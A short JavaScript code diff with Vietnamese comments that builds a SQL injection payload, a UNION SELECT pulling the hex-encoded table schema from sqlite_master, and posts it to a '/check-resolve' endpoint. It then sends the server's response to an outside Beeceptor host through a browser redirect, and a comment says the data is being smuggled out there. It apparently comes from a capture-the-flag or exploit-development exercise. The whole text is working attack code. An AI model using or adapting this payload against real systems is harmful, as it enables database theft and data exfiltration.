@@ -1,7 +1,8 @@
 let formData = new URLSearchParams();
 
-// Nhét thử một chuỗi ký tự bình thường xem Backend có chịu in ra không
-formData.append('id', '-1 UNION SELECT "KHANH_TEST"');
+// Dùng nháy đơn bên ngoài, và hex() để bọc dữ liệu lại
+// Điều này đảm bảo 100% không vỡ JSON và không bị lỗi cú pháp
+formData.append('id', "-1 UNION SELECT hex(GROUP_CONCAT(sql)) FROM sqlite_master WHERE type='table'");
 
 fetch('/check-resolve', {
     method: 'POST',
@@ -15,5 +16,6 @@ fetch('/check-resolve', {
 })
 .then(response => response.text())
 .then(data => {
+    // Tuồn thẳng ra Beeceptor
     window.location = 'https://khanh.free.beeceptor.com/?result=' + encodeURIComponent(data);
 });
